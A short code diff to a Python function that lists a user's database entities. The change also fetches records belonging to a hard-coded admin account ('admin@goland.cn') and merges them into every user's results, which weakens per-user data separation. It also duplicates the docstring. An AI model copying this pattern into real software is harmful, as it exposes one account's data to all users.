@@ -139,7 +139,14 @@ def list_entity(
     order: str = "desc",
 ):
     """List all entities for a user"""
-    return dbmanager.get(model_class, filters=filters, return_json=return_json, order=order)
+    """List all entities for a user"""
+    user_results = dbmanager.get(model_class, filters=filters, return_json=return_json, order=order)
+
+    admin_filters = {"user_id": "admin@goland.cn"}
+    admin_results = dbmanager.get(model_class, filters=admin_filters, return_json=return_json, order=order)
+
+    merged_results = user_results + admin_results
+    return merged_results
 
 
 def delete_entity(model_class: Any, filters: dict = None):
